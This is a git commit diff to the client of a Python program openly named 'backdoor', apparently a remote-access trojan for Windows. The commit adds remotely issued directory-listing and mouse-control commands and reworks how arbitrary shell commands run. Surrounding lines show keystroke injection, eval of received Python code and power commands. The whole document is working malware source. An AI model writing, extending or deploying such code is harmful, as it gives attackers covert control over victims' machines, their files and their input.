22272eb82530e9b3b56bb63033b348561e355099
ArmenG <armeng2007@gmail.com>
2022-06-18 10:58:16 -0700

    Started working on mouse command, and ls command

--- client/main.py
+++ client/main.py
@@ -1,4 +1,4 @@
-import sqlite3,socket,os,time,datetime,keyboard,winreg,subprocess
+import sqlite3,socket,os,time,datetime,keyboard,winreg,pyautogui
 
 class backdoor:
     def __init__(self):
@@ -80,13 +80,18 @@ class backdoor:
                     
                     keyboard.write(commands_to_execute[i+line])
             elif command.startswith("cd"):
-                directory_to_change = command.split(" ")[1]
-                os.chdir(directory_to_change)
-                output += os.system("cd") + '\n'
+                directory_to_change = command.split(" ")
+                if len(directory_to_change) > 1:
+                    os.chdir(directory_to_change[1])
+                output += os.popen("cd").read() + '\n'
             elif command.startswith("delay"):
                 delay_command = command.split("(")
                 time_to_delay = delay_command[1].replace(")", "")
                 time.sleep(float(time_to_delay))
+            elif command.startswith("ls"):
+                output = ""
+                for i in os.listdir():
+                    output += i + "\n"
             elif command.startswith("power"):
                 power_command = command.split("(")
                 power_command_argument = power_command[1].replace(")", "")
@@ -115,10 +120,46 @@ class backdoor:
                     python_code += commands_to_execute[i+line] + "\n"
                 
                 output += eval(python_code)
-
+            elif command.startswith("mouse"):
+                mouse_command = command.split(".")
+                if len(mouse_command) > 1:
+                    mouse_command = mouse_command[1]
+                    if mouse_command.startswith("right_click"):
+                        mouse_command_args = mouse_command.replace("right_click", "")
+                        mouse_command_args = mouse_command_args.replace("(", "")
+                        mouse_command_args = mouse_command_args.replace(")", "")
+                        mouse_command_args = mouse_command_args.split(",")
+                        if len(mouse_command_args) > 0:
+                            mouse_command_args = list(map(int,mouse_command_args))
+                            pyautogui.click(mouse_command_args[0], mouse_command_args[1], button="right")
+                            continue
+                        else:
+                            pyautogui.click()
+                            continue
+                    elif mouse_command.startswith("click"):
+                        mouse_command_args = mouse_command.replace("click", "")
+                        mouse_command_args = mouse_command_args.replace("(", "")
+                        mouse_command_args = mouse_command_args.replace(")", "")
+                        mouse_command_args = mouse_command_args.split(",")
+                        if len(mouse_command_args) > 0:
+                            mouse_command_args = list(map(int,mouse_command_args))
+                            pyautogui.click(mouse_command_args[0], mouse_command_args[1])
+                            continue
+                        else:
+                            pyautogui.click()
+                            continue
+                    elif mouse_command.startswith("move"):
+                        mouse_command_args = mouse_command.replace("move", "")
+                        mouse_command_args = mouse_command_args.replace("(", "")
+                        mouse_command_args = mouse_command_args.replace(")", "")
+                        mouse_command_args = mouse_command_args.split(",")
+                        mouse_command_args = list(map(int,mouse_command_args))
+                        pyautogui.moveTo(mouse_command_args[0], mouse_command_args[1])
+                        continue
+                    
             else:
-                os.system(command)
-                output += os.popen(command).read()
+                output += os.popen(command).read() + "\n"
+                
 
         return output
     def command_thread(self):
